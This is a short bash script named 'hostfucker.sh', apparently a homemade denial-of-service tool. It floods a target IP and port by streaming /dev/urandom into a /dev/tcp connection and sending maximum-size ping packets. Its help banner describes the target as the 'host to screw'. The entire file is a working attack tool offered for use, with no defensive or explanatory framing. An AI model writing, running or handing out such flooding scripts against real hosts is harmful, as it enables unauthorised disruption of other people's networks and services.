#!/bin/bash

function connect {
cat /dev/urandom | cat > /dev/tcp/$host/$port &&  ping -s 65507 $host
}


while getopts i:p:-port:h option 
do 
case "${option}" in 
i) host=${OPTARG};; 
p) port=${OPTARG};; 
-port) port=${OPTARG};; 
h) echo "Usage: ./hostfucker.sh -i <ip address> -p <port>";; 
 
?)
  echo "Usage: ./hostfucker.sh -i <ip address> -p <port>" >&2
  exit 1
  ;;
  esac
 connect

done 


printf """
| | | | ___  ___| |___/\____/\__ ___| | _____ _ __ 
| |_| |/ _ \/ __| __\    /\    // __| |/ / _ \ '__|
|  _  | (_) \__ \ |_/_  _\/_  _\ (__|   <  __/ |   
|_| |_|\___/|___/\__| \/    \/  \___|_|\_\___|_|   V1.3

--by vit0byt3 [vit0byt3@gmail.com]

Usage: ./hostfucker.sh -i <ip address> -p <port>
__________

-h : show this help module
-i : host to screw
-p [--port] : port to screw


"""




